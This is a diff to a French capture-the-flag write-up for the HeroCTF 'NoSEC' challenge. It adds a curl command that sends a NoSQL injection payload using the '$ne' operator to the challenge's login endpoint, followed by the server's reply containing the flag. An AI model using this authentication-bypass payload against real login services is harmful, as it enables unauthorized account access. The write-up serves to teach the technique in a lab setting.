@@ -29,13 +29,16 @@ Les données de la requête de connexion sont envoyées au format JSON.
 Grâce à cette information et au nom du challenge (NoSEC), nous pouvons deviner assez rapidement que ce challenge
 est porté sur l'injection NoSQL.
 
-Nous testons dnoc un payload assez simple :
+Nous testons donc un payload assez simple :
 
 {"username":"admin","password":{"$ne":"notvalidpassword"}}
 
 Le nom d'utilisateur est "admin" et le mot de passe n'est pas égal (not equal => $ne) à "notvalidpassword".
 
-Nous arrivons bien à nous connecter et nous obtenons le flag !
+````sh
+curl -X POST --header "Content-Type: application/json" challs.heroctf.fr:3000/login --data '{"username":"admin", "password": {"$ne": "toto"}}'
+{"state":"success","msg":"You can validate this challenge with: Hero{NoSQL_1Nject1on_wAw_1597}"}
+```
 
 ### Flag
 
